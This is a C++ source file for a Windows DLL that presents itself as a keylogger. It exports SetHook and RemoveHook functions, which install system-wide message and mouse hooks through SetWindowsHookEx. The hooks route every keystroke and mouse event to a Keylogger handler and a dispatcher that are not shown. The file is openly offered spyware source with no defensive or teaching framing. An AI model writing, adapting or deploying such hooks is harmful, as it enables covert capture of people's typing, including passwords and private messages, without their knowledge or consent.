#include <iostream>
#include <string>
#include "Keylogger.hpp"
#include <Windows.h>

#pragma data_seg("Shared")
HHOOK g_hook[2] = { NULL, NULL };
#pragma data_seg()

#pragma comment(linker,"/section:Shared,rws")
HINSTANCE g_hInst = NULL;

LRESULT __declspec(dllexport)__stdcall CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
	if (code < 0)
		return CallNextHookEx(NULL, code, wParam, lParam);
	return Keylogger::handleKey(code, wParam, lParam);
	return CallNextHookEx(NULL, code, wParam, lParam);
}

extern "C" __declspec(dllexport) void SetHook(Dispatcher *disp)
{
	Keylogger::setDispatcher(disp);
	if (g_hook[0] == NULL)
		g_hook[0] = SetWindowsHookEx(WH_GETMESSAGE, Keylogger::handleKey, g_hInst, 0);
	if (g_hook[1] == NULL)
		g_hook[1] = SetWindowsHookEx(WH_MOUSE, Keylogger::handleMouse, g_hInst, 0);
}

extern "C" __declspec(dllexport) void RemoveHook()
{
	if (g_hook[0] != NULL)
		UnhookWindowsHookEx(g_hook[0]);
	if (g_hook[1] != NULL)
		UnhookWindowsHookEx(g_hook[1]);
	g_hook[0] = NULL;
	g_hook[1] = NULL;
}

BOOL APIENTRY DllMain(HMODULE hinst, DWORD reason, LPVOID lpReserved)
{
	switch (reason)
	{
		case DLL_PROCESS_ATTACH:
			g_hInst = (HINSTANCE)hinst;
			break;
	}
	return TRUE;
}